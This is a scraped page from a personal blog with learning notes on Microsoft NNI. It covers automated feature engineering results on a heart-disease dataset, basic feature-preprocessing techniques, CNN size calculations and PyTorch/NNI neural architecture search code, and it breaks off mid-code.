<p>调用代码主体部分如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get parameter from tuner</span></span><br><span class="line">RECEIVED_PARAMS = nni.get_next_parameter()</span><br><span class="line">logger.info(<span class="string">&quot;Received params:\n&quot;</span>, RECEIVED_PARAMS)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get sample column from parameter</span></span><br><span class="line">df = pd.read_csv(file_name)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;sample_feature&#x27;</span> <span class="keyword">in</span> RECEIVED_PARAMS.keys():</span><br><span class="line">    sample_col = RECEIVED_PARAMS[<span class="string">&#x27;sample_feature&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sample_col = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># df: raw feaure + sample_feature</span></span><br><span class="line">df = name2feature(df, sample_col, target_name)</span><br><span class="line">feature_imp, val_score = lgb_model_train(df, _epoch=<span class="number">1000</span>, target_name=target_name,id_index=id_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># report result to nni</span></span><br><span class="line">nni.report_final_result(&#123;</span><br><span class="line">    <span class="string">&quot;default&quot;</span>:val_score, </span><br><span class="line">    <span class="string">&quot;feature_importance&quot;</span>:feature_imp</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="项目示例运行结果"><a href="#项目示例运行结果" class="headerlink" title="项目示例运行结果"></a>项目示例运行结果</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_1.png">
<h3 id="Top-10-Trials"><a href="#Top-10-Trials" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_2.png">
<h3 id="Default-Metric"><a href="#Default-Metric" class="headerlink" title="Default Metric"></a>Default Metric</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_4.png">
<h3 id="Hyper-parameter"><a href="#Hyper-parameter" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_6.png">
<h3 id="Feature-Importance-of-Top-1-Trial"><a href="#Feature-Importance-of-Top-1-Trial" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">         feature_name  split  ...  split_percent  feature_score</span><br><span class="line">5                  I6     39  ...      11.504425       0.145729</span><br><span class="line">4                  I5     20  ...       5.899705       0.067777</span><br><span class="line">85     AGG_max_I9_C17     14  ...       4.129794       0.053053</span><br><span class="line">76      count_C18_C23     11  ...       3.244838       0.031225</span><br><span class="line">43   AGG_mean_I11_C16      9  ...       2.654867       0.029425</span><br><span class="line">..                ...    ...  ...            ...            ...</span><br><span class="line">86    AGG_var_I11_C25      0  ...       0.000000       0.000000</span><br><span class="line">82      count_C12_C20      0  ...       0.000000       0.000000</span><br><span class="line">80       count_C1_C17      0  ...       0.000000       0.000000</span><br><span class="line">77       count_C1_C23      0  ...       0.000000       0.000000</span><br><span class="line">100     count_C15_C21      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[162 rows x 6 columns]</span><br></pre></td></tr></table></figure>
<p>若想要查询某一次trial的feature importance，只需在WebUI中按下Copy as json，再代入原程序运行就可以获得了。</p>
<h2 id="heart数据集运行结果"><a href="#heart数据集运行结果" class="headerlink" title="heart数据集运行结果"></a>heart数据集运行结果</h2><p><a target="_blank" rel="noopener" href="http://archive.ics.uci.edu/ml/datasets/Statlog+%28Heart%29">数据集地址</a></p>
<p>heart数据集收集了中老年人是否患心脏病的270条数据，每条数据有13条属性，本质上是一个二分类问题的数据。</p>
<p>我们希望通过特征工程，从数据中挖掘出心脏病患病与其他事件的相关性，从庞杂的数据中得出结论。</p>
<p>初始AUC为0.932367，使用了NNI自动特征工程之后，AUC上升到了0.97343，比原始精确度高出许多。</p>
<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example1.png">
<h3 id="Top-10-Trials-1"><a href="#Top-10-Trials-1" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example2.png">
<h3 id="Default"><a href="#Default" class="headerlink" title="Default"></a>Default</h3><p>Sorted Default MetricMetric</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example3.png">
<h3 id="Hyper-parameter-1"><a href="#Hyper-parameter-1" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example4.png">
<h3 id="Feature-Importance-of-Top-1-Trial-1"><a href="#Feature-Importance-of-Top-1-Trial-1" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                     feature_name  split  ...  split_percent  feature_score</span><br><span class="line">113          count_chest-pain_sex      4  ...       9.302326       0.197441</span><br><span class="line">37      AGG_var_chest-pain_hr-max      5  ...      11.627907       0.083669</span><br><span class="line">53         AGG_median_age_vessels      3  ...       6.976744       0.075381</span><br><span class="line">0                             age      3  ...       6.976744       0.058558</span><br><span class="line">12                           thal      2  ...       4.651163       0.056385</span><br><span class="line">..                            ...    ...  ...            ...            ...</span><br><span class="line">54            AGG_max_sex_vessels      0  ...       0.000000       0.000000</span><br><span class="line">52   AGG_median_chest-pain_hr-max      0  ...       0.000000       0.000000</span><br><span class="line">51     AGG_median_bs-fasting_thal      0  ...       0.000000       0.000000</span><br><span class="line">50       AGG_mean_age_cholesterol      0  ...       0.000000       0.000000</span><br><span class="line">138            AGG_var_sex_hr-max      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[139 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/27/Feature-Engineering-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/27/Feature-Engineering-Learning-Notes/" class="post-title-link" itemprop="url">Feature Engineering Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-27 15:06:32" itemprop="dateCreated datePublished" datetime="2021-01-27T15:06:32+08:00">2021-01-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/01/27/Feature-Engineering-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="Feature Engineering Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/27/Feature-Engineering-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/27/Feature-Engineering-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="特征的定义"><a href="#特征的定义" class="headerlink" title="特征的定义"></a>特征的定义</h3><p>feature就是从数据中提取出来的有用的属性。</p>
<h3 id="特征工程的定义"><a href="#特征工程的定义" class="headerlink" title="特征工程的定义"></a>特征工程的定义</h3><p>特征工程(Feature Engineering)是机器学习中的一个重要分支，指的是通过运用多种数据处理方法，将把原始数据转化成更好的特征的过程。</p>
<p>特征有优劣之分，更好的特征更适合机器学习，意味着能够训练出更好的结果。</p>
<h2 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h2><h3 id="去除异常数据"><a href="#去除异常数据" class="headerlink" title="去除异常数据"></a>去除异常数据</h3><p>特征清洗即在数据中去除异常数据。常见的去除异常数据方式可以基于简单统计方法借助$3\delta$原则来去除，也可以用KNN算法等内容来处理。</p>
<h3 id="处理缺失数据"><a href="#处理缺失数据" class="headerlink" title="处理缺失数据"></a>处理缺失数据</h3><p>拿数据来训练自然需要各类数据数量较均匀，有缺失会对模型准确度造成影响。</p>
<p>至于如何处理缺失数据，有几个原则：</p>
<ol>
<li>该类数据缺失得太多了，干脆全部丢弃。</li>
<li>缺失得不多的话，可以利用均值或中位数补充少量数据。</li>
<li>利用其他的算法进行缺失数据的预测，做prediction然后补齐。</li>
</ol>
<h3 id="数据采样及均衡操作"><a href="#数据采样及均衡操作" class="headerlink" title="数据采样及均衡操作"></a>数据采样及均衡操作</h3><p>做分类任务的话，正负样本要求数量较均衡，如果给定数据不均衡的话就需要数据采样操作。</p>
<p>数据采样的操作主要有两种：上采样和下采样。</p>
<h4 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h4><p>当正负两类数据规模都比较大时，可以适当对数据多的那一类进行欠采样。</p>
<h4 id="上采样"><a href="#上采样" class="headerlink" title="上采样"></a>上采样</h4><p>当正负两类规模都比较小时，应该对数据少的那一类做过采样操作，经常可以用到一个叫SMOTE的过采样算法来合成新样本，使得两类规模相当。</p>
<h3 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h3><h4 id="数值数据"><a href="#数值数据" class="headerlink" title="数值数据"></a>数值数据</h4><p>针对普通数值型数据，一般可以使用MinMax或者标准化来做无量纲化操作。</p>
<p>这里的所谓标准化方法，就是处理出均值和方差，每个数据就表示成跟均值差了多少个方差（带正负符号）。</p>
<p>两种方法分别可以在<code>sklearn.preprocessing</code>的<code>StandardScaler</code>和<code>MinMaxScaler</code>找到。</p>
<h4 id="分类数据"><a href="#分类数据" class="headerlink" title="分类数据"></a>分类数据</h4><p>针对分类数据，经常需要转化成OneHot编码，这个操作可以在<code>pandas</code>或者<code>sklearn</code>里做到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder, LabelEncoder</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(&#123;<span class="string">&#x27;age&#x27;</span>: [<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>], <span class="string">&#x27;pet&#x27;</span>: [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># method 1</span></span><br><span class="line">pet_values = LabelEncoder.fit_transform(data.pet) <span class="comment"># [0, 1, 1, 2]，即离散化</span></span><br><span class="line">OneHotEncoder().fit_transform(pet_values.reshape(-<span class="number">1</span>, <span class="number">1</span>)).toarray()</span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">pd.get_dummies(data,columns=[<span class="string">&#x27;pet&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="时间数据"><a href="#时间数据" class="headerlink" title="时间数据"></a>时间数据</h4><p>时间数据最简便的是用<code>pandas</code>中的<code>DatetimeIndex</code>直接做。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/25/Convolution-Neural-Network-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/25/Convolution-Neural-Network-Learning-Notes/" class="post-title-link" itemprop="url">Convolution Neural Network Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-25 13:00:29" itemprop="dateCreated datePublished" datetime="2021-01-25T13:00:29+08:00">2021-01-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/01/25/Convolution-Neural-Network-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="Convolution Neural Network Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/25/Convolution-Neural-Network-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/25/Convolution-Neural-Network-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Definition-of-Convolution-Neural-Network"><a href="#Definition-of-Convolution-Neural-Network" class="headerlink" title="Definition of Convolution Neural Network"></a>Definition of Convolution Neural Network</h2><p>Definition in Discrete Mathematics:</p>
<script type="math/tex; mode=display">h(x) = (f*g)(x) = \sum_{t=-\infty}^{\infty} f(t)g(x-t)</script><p>Two-dimensional Definition(I: image, K: kernal, cross-correlation):</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i-m,j-n)K(m,n)</script><p>However, our convolution here does not reverse kernal, which means actually:</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i+m,j+n)K(m,n)</script><p>Without reversed kernal, the operation is exactly the matrix dot multiplication.</p>
<h2 id="Relevant-Concepts"><a href="#Relevant-Concepts" class="headerlink" title="Relevant Concepts"></a>Relevant Concepts</h2><p>A kernal is a square matrix responsible for extracting a feature from input. When using multiple kernal, we can extract multiple features from the same picture sample.</p>
<p>The size of kernal is commonly an odd number, and especially there exists 1*1 kernal.</p>
<p>The set of convolution kernals is called Filter. The number of kernal in a filter is usually euqal to that of input channels. For example, when processing RGB pictures, we usually use three kernals to calculate with corresponding channels, and these three kernals can be included in a filter.</p>
<p>Similarly with neural network learnt before, there is a bias corresponding with each filter, whose size is the same as the output size of the filter.</p>
<p>Several filters and their corresponding bias matrices consist of a WeightsBias.</p>
<p>Stride is a parameter of a convolution layer, which stands for the increment of coordination of width and height after each update is done. By default the stride is set 1. Obviously, the bigger the stride, the smaller the output size.</p>
<p>Padding is used when we want to control the output size. When padding is needed, we will add several layer of zeros on the edge of original matrix, thus incrementing the size. By default the padding is 0. On the contrary, the bigger the padding, the bigger the output size.</p>
<h2 id="Size-Calculation"><a href="#Size-Calculation" class="headerlink" title="Size Calculation"></a>Size Calculation</h2><p>Actually we can calculate the width and height of output:</p>
<script type="math/tex; mode=display">Width_{out} = \lfloor \frac{Width_{in} - Width_{K} + 2Padding}{Stride} \rfloor + 1</script><script type="math/tex; mode=display">Height_{out} = \lfloor \frac{Height_{in} - Height_{K} + 2Padding}{Stride} \rfloor+ 1</script><h2 id="About-PyTorch"><a href="#About-PyTorch" class="headerlink" title="About PyTorch"></a>About PyTorch</h2><p>When retrieving data from the dataloader previously loaded, the dimension of the input tensor is 4, respectively:</p>
<ol>
<li>batch size: int, one part of hyper-parameter</li>
<li>input channels: int, the number of channels of data(gray-scale: 1, RGB: 3)</li>
<li>width: int, consistent with dataset</li>
<li>height: int, consistent with dataset</li>
</ol>
<p>The number of first dimension remains unchanged during the whole forward process. However, input channels will be changed according to our design of convolution layers. Width and height can be calculated by applying the formulas above.</p>
<p>When <code>LayerChoice</code> and <code>InputChoice</code> are used in definition of model, we must guarantee each calculation is meaningful rather than size dismatched.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice(OrderedDict([</span><br><span class="line">            (<span class="string">&quot;conv3*3&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>)),</span><br><span class="line">            (<span class="string">&quot;conv5*5&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>))</span><br><span class="line">        ]), key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&quot;skip_conv&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        old_x = x</span><br><span class="line">        zero_x = torch.zeros_like(old_x)</span><br><span class="line">        skip_x = self.input_switch([zero_x, old_x])</span><br><span class="line">        x = F.relu(self.mid_conv(x))</span><br><span class="line">        x += skip_x</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In this example, dataset is CIFAR-10, where all samples are 32*32.</p>
<p>When<code>x = self.conv1(x)</code>, now the size may be 30 or 28. After 2*2 pooling, the size(width and height) may be 15 or 14.</p>
<p>Here we must make the size unchanged after <code>x = self.mid_conv(x)</code> since it is a layer allowed to be skipped. And we can see when kernal size is 3, padding is 1 and kernal size equals 5, padding euqals 2, width and height both remain unchanged.</p>
<p>After <code>x = self.conv2(x)</code>, the size shrinks to 10 or 11. After max-pooling, the size becomes 5 as expected.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/23/NNI-Exploration-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/23/NNI-Exploration-Learning-Notes/" class="post-title-link" itemprop="url">NNI Exploration Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-23 23:19:35" itemprop="dateCreated datePublished" datetime="2021-01-23T23:19:35+08:00">2021-01-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/01/23/NNI-Exploration-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Exploration Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/23/NNI-Exploration-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/23/NNI-Exploration-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = 